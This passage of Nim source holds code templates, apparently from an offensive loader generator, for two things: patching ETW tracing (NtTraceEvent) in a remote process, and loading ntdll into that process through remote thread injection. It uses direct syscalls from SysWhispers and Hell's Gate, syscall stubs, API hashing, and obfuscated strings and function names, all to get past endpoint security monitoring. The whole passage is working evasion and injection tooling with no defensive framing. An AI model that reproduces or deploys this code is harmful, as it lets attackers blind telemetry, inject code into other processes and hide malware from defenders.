                pHandle, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                pHandle, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
            when defined(verbose):
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                pHandle,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = NtClose(tHandle)
            status = NtClose(pHandle)

            if(status == 0):
                return true
            else:
                return false
            when defined(GetSyscallStub):
                # This doesn't work so far for some reason
                when defined(DInvoke):
                    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
                else:
                    success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
                if (success):
                    when defined(verbose):
                        echo obf("set back old protect")
                        echo success

"""



let RemotePatchETWStub* = """

    proc RemotePatchETW(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        elif defined i386:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112


        var disabled: bool = false
    
        var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("ntdll.dll"))
        if RemoteHandle == 0:
            when defined(verbose):
                echo obf("[X] Failed to get ntdll.dll handle")
            return disabled

        var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("NtTraceEvent"))
        if RemoteProc == NULL:
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'NtTraceEvent'")
            return disabled
        
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(GetSyscallStub):
                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

                # Define NtProtectVirtualMemory
                var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
                when defined(DInvoke):
                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                else:
                    success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                # define NtWriteVirtualMemory
                let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
                when defined(DInvoke):
                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                else:
                    success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                
                success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))


            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        var cid: CLIENT_ID
        var hProcams: HANDLE
        var status: NTSTATUS
        cid.UniqueProcess = remoteProcID
        var oa: OBJECT_ATTRIBUTES
        when defined(SysWhispers):
            status = opqiwepoausdasdjl(&hProcams,PROCESS_ALL_ACCESS,&oa, &cid)
        else:
            when defined(GetSyscallStub):
                when defined(DInvoke):
                    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
                
                    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                    let syscallStub_NtOpenP2 = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
                else:
                    let syscallStub_NtOpenP2 = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
                var oldProtection: DWORD = 0
                # define NtOpenProcess
                var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP2))
                VirtualProtect(cast[LPVOID](syscallStub_NtOpenP2), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
                success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP2))
        
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            status = NtOpenProcess(
                &hProcams,
                PROCESS_ALL_ACCESS, 
                &oa, &cid         
            )
        when defined(verbose):
            echo obf("[*] NtOpenProcess: "), toHex(status)
        
        #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
        success = RemotePatchETW(hProcams)
        if (success == 0):
            success = remoteLoadNtdll(remoteProcID)
            HowMuchTimeWouldYoulikeToSleep(2)
            success = RemotePatchETW(hProcams)
        when defined(verbose):
            echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"


"""


let RemoteLoadNTDLLStub* = """

    proc remoteLoadNtdll(processID: var DWORD): bool =

    
        # C:\windows\system32\ntdll.dll
        var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
        char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
        char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
        char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
        
        when defined(verbose):
            echo obf("[*] Loading ntdll.dll in the remote process: "), processID
        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        var pHandle: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

        when defined(SysWhispers):
            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)

            when defined(verbose):
                echo obf("[*] opqiwepoausdasdjl: "), status

            status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] oqiahsjynmxkla: "), status
            var bytesWritten: SIZE_T

            status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] oqiazasusjk: "), status
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(pHandle)
            if(status == 0):
                return true
            else:
                return false
        else:

            when defined(GetSyscallStub):
                when defined(DInvoke):
                    let tProcess2 = MyGetCurrentProcessId()
                    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
                    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

                    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                    let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
                else:
                    let tProcess2 = GetCurrentProcessId()
                    let pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

                    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)

        
                var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


                var oldProtection: DWORD = 0

                # define NtOpenProcess
                var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
                VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                # define NtAllocateVirtualMemory
                let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
                VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                # define NtWriteVirtualMemory
                let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
                VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                # define NtCreateThreadEx
                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                var success: BOOL

                success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
                success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
                success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            status = NtOpenProcess(
                &pHandle,
                PROCESS_ALL_ACCESS, 
                &oa, &cid         
            )
            when defined(verbose):
                echo obf("[*] NtOpenProcess: "), toHex(status)

            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                pHandle, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                pHandle, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                pHandle,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = NtClose(tHandle)
            status = NtClose(pHandle)

            if(status == 0):
                return true
            else:
                return false
            when defined(GetSyscallStub):
                # This doesn't work so far for some reason
                when defined(DInvoke):
                    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
                else:
                    success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
                if (success):
                    when defined(verbose):
                        echo obf("set back old protect")
                        echo success

"""
